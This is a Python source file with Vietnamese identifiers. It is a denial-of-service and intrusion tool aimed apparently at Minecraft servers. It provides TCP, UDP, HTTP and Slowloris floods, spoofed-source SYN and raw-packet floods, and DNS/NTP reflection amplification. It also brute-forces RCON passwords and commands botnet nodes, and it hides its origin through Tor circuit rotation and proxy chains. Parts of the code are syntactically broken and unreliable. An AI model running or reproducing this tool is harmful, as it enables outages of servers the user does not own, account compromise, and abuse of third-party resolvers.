import asyncio
import aiohttp
import yaml
import logging
import random
import socket
import struct
import time
import string
import itertools
import os
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
from dataclasses import dataclass
from typing import Optional, List, Dict, Tuple
from stem.control import Controller
from prometheus_client import Counter, Gauge, Histogram, start_http_server
from pproxy.connection import ProxyConnection
from datetime import datetime

# Cấu hình logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(), logging.FileHandler('tan_cong_may_chu.log')]
)
logger = logging.getLogger(__name__)

# Prometheus metrics
goi_tin_tan_cong = Counter('goi_tin_tan_cong_tong', 'Tổng số gói tin gửi', ['loai_tan_cong', 'may_chu'])
do_tre_phap_hoi = Gauge('do_tre_phap_hoi', 'Độ trễ phản hồi từ server', ['may_chu'])
thoi_gian_tan_cong = Histogram('thoi_gian_tan_cong', 'Thời gian xử lý mỗi yêu cầu', ['loai_tan_cong'])

# Cấu hình tấn công
@dataclass
class CauHinhTanCong:
    danh_sach_may_chu: List[Tuple[str, int]]  # [(IP, Port), ...]
    cong_rcon: int
    loai_tan_cong: str
    so_luong_luong: int
    kich_thuoc_goi_tin: int
    thoi_gian_tan_cong: int
    su_dung_proxy: bool
    su_dung_botnet: bool
    su_dung_tor: bool
    api_proxy: str = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5"
    api_botnet: str = ""  # Thay bằng API botnet thực tế
    so_ket_noi_toi_da: int = 5000
    toc_do_co_ban: float = 0.01
    do_tre_toi_da: float = 0.3
    so_circuit_tor: int = 5  # Số circuit Tor đồng thời
    danh_sach_amplification: List[str] = ["pool.ntp.org", "time.google.com", "8.8.8.8"]

# Quản lý tài nguyên
class QuanLyTaiNguyen:
    def __init__(self):
        self.hang_doi_proxy = Queue()
        self.hang_doi_botnet = Queue()
        self.danh_sach_tor = []
        self.danh_sach_ket_noi: Dict[str, socket.socket] = {}
        self.proxy_chain = ProxyConnection()
        self.thoi_gian_xoay_circuit = 30

    async def tai_proxy(self, api_url: str):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url) as response:
                    if response.status == 200:
                        proxies = (await response.text()).splitlines()
                        for proxy in proxies:
                            self.hang_doi_proxy.put(proxy)
                        logger.info(f"Đã tải {self.hang_doi_proxy.qsize()} proxy SOCKS5.")
                    else:
                        logger.error(f"Lỗi tải proxy: HTTP {response.status}")
        except Exception as e:
            logger.error(f"Lỗi tải proxy: {e}")

    async def tai_botnet(self, api_url: str):
        try:
            if not api_url:
                with open("botnet.txt", "r") as f:
                    bots = f.read().splitlines()
                    for bot in bots:
                        self.hang_doi_botnet.put(bot)
                logger.info(f"Đã tải {self.hang_doi_botnet.qsize()} bot từ file.")
            else:
                async with aiohttp.ClientSession() as session:
                    async with session.get(api_url) as response:
                        if response.status == 200:
                            bots = (await response.text()).splitlines()
                            for bot in bots:
                                self.hang_doi_botnet.put(bot)
                            logger.info(f"Đã tải {self.hang_doi_botnet.qsize()} bot từ API.")
        except Exception as e:
            logger.error(f"Lỗi tải botnet: {e}")

    def khoi_tao_tor(self, so_circuit: int):
        try:
            for i in range(so_circuit):
                ket_noi = Controller.from_port(port=9051 + i)
                ket_noi.authenticate()
                self.danh_sach_tor.append(ket_noi)
            logger.info(f"Đã khởi tạo {so_circuit} circuit Tor.")
            asyncio.create_task(self.xoay_vong_circuit_tor())
        except Exception as e:
            logger.error(f"Lỗi khởi tạo Tor: {e}")

    async def xoay_vong_circuit_tor(self):
        while True:
            try:
                for ket_noi in self.danh_sach_tor:
                    ket_noi.signal('NEWNYM')
                logger.info("Đã xoay vòng tất cả circuit Tor.")
                await asyncio.sleep(self.thoi_gian_xoay_circuit)
            except Exception as e:
                logger.error(f"Lỗi xoay vòng circuit Tor: {e}")

    def kiem_tra_ket_noi(self, sock: socket.socket) -> bool:
        try:
            sock.settimeout(0.05)
            sock.send(b'\x00')
            return True
        except:
            return False

    def lay_ket_noi(self, loai: str) -> socket.socket:
        if loai in self.danh_sach_ket_noi and self.kiem_tra_ket_noi(self.danh_sach_ket_noi[loai]):
            return self.danh_sach_ket_noi.pop(loai)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(False)
        return sock

    def tra_ket_noi(self, loai: str, sock: socket.socket):
        if len(self.danh_sach_ket_noi) < self.cau_hinh.so_ket_noi_toi_da and self.kiem_tra_ket_noi(sock):
            self.danh_sach_ket_noi[loai] = sock

    def lay_proxy(self) -> Optional[tuple]:
        if not self.hang_doi_proxy.empty():
            proxy = self.hang_doi_proxy.get().split(':')
            return proxy[0], int(proxy[1])
        return None

    def lay_bot(self) -> Optional[tuple]:
        if not self.hang_doi_botnet.empty():
            bot = self.hang_doi_botnet.get().split(':')
            return bot[0], int(bot[1])
        return None

    async def lay_proxy_chain(self) -> Optional[str]:
        if self.hang_doi_proxy.qsize() >= 2:
            proxy1 = self.lay_proxy()
            proxy2 = self.lay_proxy()
            return f"socks5://{proxy1[0]}:{proxy1[1]}->socks5://{proxy2[0]}:{proxy2[1]}"
        return None

# Tạo gói tin Minecraft
class GoiTinMinecraft:
    @staticmethod
    async def phan_tich_phien_ban(ip: str, cong: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            await asyncio.get_event_loop().run_in_executor(None, sock.connect, (ip, cong))
            handshake = bytearray([0x00, 0x00, 0x00, 0x00, 0x01])
            sock.sendall(bytes([len(handshake)]) + handshake)
            phan_hoi = sock.recv(1024)
            phien_ban = struct.unpack('>H', phan_hoi[2:4])[0] if len(phan_hoi) > 4 else random.choice([47, 340, 754, 759])
            sock.close()
            return phien_ban
        except:
            return random.choice([47, 340, 754, 759])

    @staticmethod
    def tao_handshake(dia_chi: str, cong: int, phien_ban: int) -> bytes:
        packet = bytearray()
        packet.append(0x00)  # Handshake
        packet += struct.pack('>H', phien_ban)
        packet += struct.pack('>B', len(dia_chi)) + dia_chi.encode()
        packet += struct.pack('>H', cong)
        packet += struct.pack('>B', random.choice([1, 2]))  # Status hoặc Login
        return bytes([len(packet)]) + packet

    @staticmethod
    def tao_login() -> bytes:
        packet = bytearray()
        packet.append(0x00)  # Login Start
        ten = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(16))
        packet += struct.pack('>B', len(ten)) + ten.encode()
        packet += b'\x00' * random.randint(0, 16)  # Payload ngẫu nhiên để tránh phát hiện
        return bytes([len(packet)]) + packet

    @staticmethod
    def tao_keep_alive() -> bytes:
        packet = bytearray()
        packet.append(0x00)  # Keep Alive
        packet += struct.pack('>L', random.randint(0, 0xFFFFFFFF))
        return bytes([len(packet)]) + packet

# Lớp tấn công cơ bản
class TanCongCoBan:
    def __init__(self, cau_hinh: CauHinhTanCong, tai_nguyen: QuanLyTaiNguyen):
        self.cau_hinh = cau_hinh
        self.tai_nguyen = tai_nguyen
        self.loop = asyncio.get_event_loop()
        self.toc_do_hien_tai = self.cau_hinh.toc_do_co_ban
        self.so_lan_thu_lai = 3

    async def dieu_chinh_toc_do(self, ip: str, cong: int):
        try:
            start = time.time()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            await self.loop.run_in_executor(None, sock.connect_ex, (ip, cong))
            do_tre = time.time() - start
            do_tre_phap_hoi.labels(may_chu=ip).set(do_tre)
            if do_tre > self.cau_hinh.do_tre_toi_da:
                self.toc_do_hien_tai = min(self.toc_do_hien_tai * 1.3, 0.5)
            else:
                self.toc_do_hien_tai = max(self.toc_do_hien_tai * 0.7, 0.005)
            sock.close()
        except:
            self.toc_do_hien_tai = min(self.toc_do_hien_tai * 1.5, 0.5)

    async def thuc_hien(self, id_luong: int, ip: str, cong: int):
        raise NotImplementedError

# Tấn công TCP Flood
class TanCongTCP(TanCongCoBan):
    async def thuc_hien(self, id_luong: int, ip: str, cong: int):
        phien_ban = await GoiTinMinecraft.phan_tich_phien_ban(ip, cong)
        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
        so_goi_tin = 0
        while time.time() < thoi_diem_ket_thuc:
            for _ in range(self.so_lan_thu_lai):
                proxy = await self.tai_nguyen.lay_proxy_chain() if self.cau_hinh.su_dung_proxy else None
                try:
                    with thoi_gian_tan_cong.labels(loai_tan_cong='tcp').time():
                        sock = self.tai_nguyen.lay_ket_noi('tcp')
                        if self.cau_hinh.su_dung_tor:
                            sock.bind(('localhost', 9050 + random.randint(0, self.cau_hinh.so_circuit_tor - 1)))
                        muc_tieu = proxy or (ip, cong)
                        await self.loop.run_in_executor(None, sock.connect_ex, muc_tieu)
                        handshake = GoiTinMinecraft.tao_handshake(ip, cong, phien_ban)
                        login = GoiTinMinecraft.tao_login()
                        keep_alive = GoiTinMinecraft.tao_keep_alive()
                        await self.loop.run_in_executor(None, sock.sendall, handshake + login + keep_alive)
                        so_goi_tin += 3
                        goi_tin_tan_cong.labels(loai_tan_cong='tcp', may_chu=ip).inc(3)
                        await self.dieu_chinh_toc_do(ip, cong)
                        await asyncio.sleep(self.toc_do_hien_tai)
                        self.tai_nguyen.tra_ket_noi('tcp', sock)
                        break
                except:
                    if sock:
                        sock.close()
                    await asyncio.sleep(0.1)
        logger.info(f"Luồng TCP {id_luong} gửi {so_goi_tin} gói tin tới {ip}:{cong}")

# Tấn công UDP Flood
class TanCongUDP(TanCongCoBan):
    async def thuc_hien(self, id_luong: int, ip: str, cong: int):
        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
        so_goi_tin = 0
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setblocking(False)
        while time.time() < thoi_diem_ket_thuc:
            try:
                with thoi_gian_tan_cong.labels(loai_tan_cong='udp').time():
                    goi_tin = os.urandom(self.cau_hinh.kich_thuoc_goi_tin)
                    sock.sendto(goi_tin, (ip, cong))
                    so_goi_tin += 1
                    goi_tin_tan_cong.labels(loai_tan_cong='udp', may_chu=ip).inc()
                    await self.dieu_chinh_toc_do(ip, cong)
                    await asyncio.sleep(self.toc_do_hien_tai)
            except:
                await asyncio.sleep(0.01)
        sock.close()
        logger.info(f"Luồng UDP {id_luong} gửi {so_goi_tin} gói tin tới {ip}:{cong}")

# Tấn công HTTP Flood
class TanCongHTTP(TanCongCoBan):
    async def thuc_hien(self, id_luong: int, ip: str, cong: int):
        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian remember:
            async with aiohttp.ClientSession() as session:
                while time.time() < thoi_diem_ket_thuc:
                    for _ in range(self.so_lan_thu_lai):
                        try:
                            with thoi_gian_tan_cong.labels(loai_tan_cong='http').time():
                                proxy = await self.tai_nguyen.lay_proxy_chain() if self.cau_hinh.su_dung_proxy else None
                                headers = {
                                    'User-Agent': random.choice([
                                        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
                                        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
                                    ]),
                                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                    'X-Custom-Payload': str(random.randint(1, 1000000))
                                }
                                async with session.get(f'http://{ip}/', headers=headers, proxy=proxy, timeout=5) as response:
                                    so_yeu_cau += 1
                                    goi_tin_tan_cong.labels(loai_tan_cong='http', may_chu=ip).inc()
                                await self.dieu_chinh_toc_do(ip, 80)
                                await asyncio.sleep(self.toc_do_hien_tai)
                                break
                        except:
                            await asyncio.sleep(0.1)
        logger.info(f"Luồng HTTP {id_luong} gửi {so_yeu_cau} yêu cầu đến {ip}")

# Tấn công Slowloris
class TanCongSlowloris(TanCongCoBan):
    async def thuc_hien(self, id_luong: int, ip: str, cong: int):
        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
        danh_sach_socket = []
        while time.time() < thoi_diem_ket_thuc:
            try:
                with thoi_gian_tan_cong.labels(loai_tan_cong='slowloris').time():
                    sock = self.tai_nguyen.lay_ket_noi('slowloris')
                    if self.cau_hinh.su_dung_tor:
                        sock.bind(('localhost', 9050 + random.randint(0, self.cau_hinh.so_circuit_tor - 1)))
                    proxy = self.tai_nguyen.lay_proxy() if self.cau_hinh.su_dung_proxy else None
                    muc_tieu = proxy or (ip, 80)
                    await self.loop.run_in_executor(None, sock.connect_ex, muc_tieu)
                    sock.send(f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: keep-alive\r\n".encode())
                    danh_sach_socket.append(sock)
                    await asyncio.sleep(random.uniform(0.1, 0.5))
                    for s in danh_sach_socket[:]:
                        try:
                            s.send(f"X-{random.randint(1, 1000)}: {random.randint(1, 1000)}\r\n".encode())
                        except:
                            danh_sach_socket.remove(s)
                            s.close()
            except:
                if sock:
                    sock.close()
        for s in danh_sach_socket:
            s.close()
        logger.info(f"Luồng Slowloris {id_luong} hoàn thành với {ip}")

# Tấn công RCON
class TanCongRCON(TanCongCoBan):
    async def thuc_hien(self, id_luong: int, ip: str, cong: int):
        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
        try:
            with open("files/mat_khau_rcon.txt", "r") as file:
                mat_khau = file.read().splitlines()
        except FileNotFoundError:
            mat_khau = [''.join(random.choices(string.ascii_letters + string.digits, k=8)) for _ in range(1000)]
        for mk in mat_khau:
            if time.time() >= thoi_diem_ket_thuc:
                break
            try:
                with thoi_gian_tan_cong.labels(loai_tan_cong='rcon').time():
                    sock = self.tai_nguyen.lay_ket_noi('rcon')
                    await self.loop.run_in_executor(None, sock.connect_ex, (ip, self.cau_hinh.cong_rcon))
                    goi_tin = bytearray([0x00, 0x00, 0x00, 0x01, 0x03])
                    goi_tin += struct.pack('!B', len(mk)) + mk.encode('utf-8') + b'\x00\x00'
                    goi_tin = struct.pack('!I', len(goi_tin)) + goi_tin
                    await self.loop.run_in_executor(None, sock.sendall, goi_tin)
                    phan_tra = await self.loop.run_in_executor(None, sock.recv, 1024)
                    if b'authenticated' in phan_tra:
                        logger.info(f"Luồng RCON {id_luong} tìm thấy mật khẩu: {mk} cho {ip}:{self.cau_hinh.cong_rcon}")
                        sock.close()
                        return
                    self.tra_ket_noi('rcon', sock)
                except Exception:
                    if sock:
                        sock.close()
            await asyncio.sleep(self.toc_do_hien_tai)
        logger.info(f"Luồng RCON {id_luong} không tìm thấy mật khẩu cho {ip}")

# Tấn công Botnet
class TanCongBotnet(TanCongCoBan):
    async def thuc_hien(self, id_luong: int, ip: str, cong: int):
        bot = self.tai_nguyen.lay_bot()
        if not bot:
            logger.error(f"Luồng Botnet {id_luong} không có bot sẵn sàng!")
            return
        bot_ip, bot_cong = bot
        phien_ban = await GoiTinMinecraft.phan_tich_phien_ban(ip, cong)
        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
        so_goi_tin = 0
        try:
            with thoi_gian_tan_cong.labels(loai_tan_cong='botnet').time():
                sock = self.tai_nguyen.lay_ket_noi('botnet')
                await self.loop.run_in_executor(None, sock.connect_ex, (bot_ip, bot_cong))
                sock.sendall(f"ATTACK {ip}:{cong} PROTOCOL {phien_ban}".encode())
                while time.time() < thoi_diem_ket_thuc:
                    handshake = GoiTinMinecraft.tao_handshake(ip, cong, phien_ban)
                    login = GoiTinMinecraft.tao_login()
                    await self.loop.run_in_executor(None, sock.sendall, handshake + login)
                    so_goi_tin += 2
                    goi_tin_tan_cong.labels(loai_tan_cong='botnet', may_chu=ip).inc(2)
                    await self.dieu_chinh_toc_do(ip, cong)
                    await asyncio.sleep(self.toc_do_hien_tai)
                sock.close()
        except:
            if sock:
                sock.close()
        logger.info(f"Botnet {id_luong} gửi {so_goi_tin} gói tin từ {bot_ip} tới {ip}:{cong}")

# Tấn công SYN/ACK Flood
class TanCongSYNAck:
    def __init__(self, cau_hinh: CauHinhTanCong):
        self.cau_hinh = cau_hinh

    def thuc_hien(self, ip: str, cong: int):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
            while time.time() < thoi_diem_ket_thuc:
                with thoi_gian_tan_cong.labels(loai_tan_cong='syn_ack').time():
                    ip_nguon = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 0, 0, 64, 6, 0,
                                           socket.inet_aton(ip_nguon), socket.inet_aton(ip))
                    cong_nguon = random.randint(1024, 65535)
                    tcp_header = struct.pack('!HHLLBBHHH', cong_nguon, cong, 0, 0, 0x50, random.choice([2, 18]), 8192, 0, 0)
                    goi_tin = ip_header + tcp_header
                    sock.sendto(goi_tin, (ip, 0))
                    goi_tin_tan_cong.labels(loai_tan_cong='syn_ack', may_chu=ip).inc()
        except PermissionError:
            logger.error("SYN/ACK flood yêu cầu quyền root!")
        except Exception as e:
            logger.error(f"Lỗi SYN/ACK flood: {e}")

# Tấn công Raw Flood
class TanCongRaw:
    def __init__(self, cau_hinh: CauHinhTanCong):
        self.cau_hinh = cau_hinh

    async def thuc_hien(self, ip: str, cong: int):
        phien_ban = await GoiTinMinecraft.phan_tich_phien_ban(ip, cong)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
            while time.time() < thoi_diem_ket_thuc:
                with thoi_gian_tan_cong.labels(loai_tan_cong='raw').time():
                    ip_nguon = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 0, 0, 64, 17, 0,
                                           socket.inet_aton(ip_nguon), socket.inet_aton(ip))
                    goi_tin = ip_header + GoiTinMinecraft.tao_handshake(ip, cong, phien_ban)
                    sock.sendto(goi_tin, (ip, cong))
                    goi_tin_tan_cong.labels(loai_tan_cong='raw', may_chu=ip).inc()
            sock.close()
        except PermissionError:
            logger.error("Raw flood yêu cầu quyền root!")
        except Exception as e:
            logger.error(f"Lỗi raw flood: {e}")

# Tấn công DNS/NTP Amplification
class TanCongAmplification:
    def __init__(self, cau_hinh: CauHinhTanCong):
        self.cau_hinh = cau_hinh

    async def thuc_hien(self, ip: str, cong: int):
        thoi_diem_ket_thuc = time.time() + self.cau_hinh.thoi_gian_tan_cong
        while time.time() < thoi_diem_ket_thuc:
            try:
                with thoi_gian_tan_cong.labels(loai_tan_cong='amplification').time():
                    may_chu = random.choice(self.cau_hinh.danh_sach_amplification)
                    if 'ntp' in may_chu.lower():
                        goi_tin = scapy.IP(src=ip, dst=may_chu) / scapy.UDP(sport=cong, dport=123) / scapy.Raw(load=b'\x17\x00\x03\x2a' + b'\x00'*36)
                    else:
                        goi_tin = scapy.IP(src=ip, dst=may_chu) / scapy.UDP(sport=cong, dport=53) / scapy.DNS(rd=1, qd=scapy.DNSQR(qname="example.com"))
                    scapy.send(goi_tin, verbose=False)
                    goi_tin_tan_cong.labels(loai_tan_cong='amplification', may_chu=ip).inc()
                    await asyncio.sleep(0.005)
            except Exception as e:
                logger.error(f"Lỗi amplification: {e}")

# Điều phối tấn công
class DieuPhoiTanCong:
    def __init__(self, cau_hinh: CauHinhTanCong):
        self.cau_hinh = cau_hinh
        self.tai_nguyen = QuanLyTaiNguyen()
        self.cac_loai_tan_cong = {
            'tcp': TanCongTCP,
            'udp': TanCongUDP,
            'http': TanCongHTTP,
            'slowloris': TanCongSlowloris,
            'rcon': TanCongRCON,
            'botnet': TanCongBotnet,
            'amplification': TanCongAmplification
        }

    async def khoi_tao(self):
        if self.cau_hinh.su_dung_proxy:
            await self.tai_nguyen.tai_proxy(self.cau_hinh.api_proxy)
        if self.cau_hinh.su_dung_botnet:
            await self.tai_nguyen.tai_botnet(self.cau_hinh.api_botnet)
        if self.cau_hinh.su_dung_tor:
            self.tai_nguyen.khoi_tao_tor(self.cau_hinh.so_circuit_tor)

    async def chay(self):
        start_http_server(8080)
        nhiem_vu = []
        for ip, cong in self.cau_hinh.danh_sach_may_chu:
            if self.cau_hinh.loai_tan_cong in ['raw', 'syn_ack', 'amplification']:
                with ThreadPoolExecutor() as executor:
                    if self.cau_hinh.loai_tan_cong == 'raw':
                        executor.submit(TanCongRaw(self.cau_hinh).thuc_hien, ip, cong)
                    elif self.cau_hinh.loai_tan_cong == 'syn_ack':
                        executor.submit(TanCongSYNAck(self.cau_hinh).thuc_hien, ip, cong)
                    else:
                        nhiem_vu.append(TanCongAmplification(self.cau_hinh).thuc_hien(ip, cong))
            else:
                loai_tan_cong = self.cac_loai_tan_cong.get(self.cau_hinh.loai_tan_cong)
                if not loai_tan_cong:
                    logger.error(f"Loại tấn công không hợp lệ: {self.cau_hinh.loai_tan_cong}")
                    return
                tan_cong = loai_tan_cong(self.cau_hinh, self.tai_nguyen)
                nhiem_vu.extend([tan_cong.thuc_hien(i + 1, ip, cong) for i in range(self.cau_hinh.so_luong_luong)])
        await asyncio.gather(*nhiem_vu)
        logger.info(f"Tấn công hoàn tất vào {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

# Hàm chính
async def main():
    try:
        danh_sach_may_chu = []
        while True:
            dia_chi = input("Nhập địa chỉ máy chủ (IP:Cổng, để trống để kết thúc): ")
            if not dia_chi:
                break
            ip, cong = dia_chi.split(':')
            danh_sach_may_chu.append((ip, int(cong)))
        if not danh_sach_may_chu:
            raise ValueError("Cần ít nhất một máy chủ mục tiêu!")

        loai_tan_cong = input("Chọn loại tấn công (tcp/udp/raw/http/slowloris/rcon/botnet/syn_ack/amplification): ").lower()
        so_luong_luong = int(input("Nhập số lượng luồng: "))
        kich_thuoc_goi = int(input("Nhập kích thước gói tin (bytes, cho UDP): "))
        thoi_gian_tan_cong = int(input("Nhập thời gian tấn công (giây): "))
        su_dung_proxy = input("Sử dụng proxy? (y/n): ").lower() == 'y'
        su_dung_botnet = input("Sử dụng botnet? (y/n): ").lower() == 'y'
        su_dung_tor = input("Sử dụng Tor? (y/n): ").lower() == 'y'
        cong_rcon = int(input("Nhập cổng RCON (mặc định 0 để bỏ qua): ") or 0)

        cau_hinh = CauHinhTanCong(
            danh_sach_may_chu=danh_sach_may_chu,
            cong_rcon=cong_rcon,
            loai_tan_cong=loai_tan_cong,
            so_luong_luong=so_luong_luong,
            kich_thuoc_goi_tin=kich_thuoc_goi,
            thoi_gian_tan_cong=thoi_gian_tan_cong,
            su_dung_proxy=su_dung_proxy,
            su_dung_botnet=su_dung_botnet,
            su_dung_tor=su_dung_tor
        )

        dieu_phoi = DieuPhoiTanCong(cau_hinh)
        await dieu_phoi.khoi_tao()
        await dieu_phoi.chay()
    except ValueError as e:
        logger.error(f"Lỗi nhập liệu: {e}")
    except Exception as e:
        logger.error(f"Lỗi không mong đợi: {e}")

if __name__ == "__main__":
    asyncio.run(main())
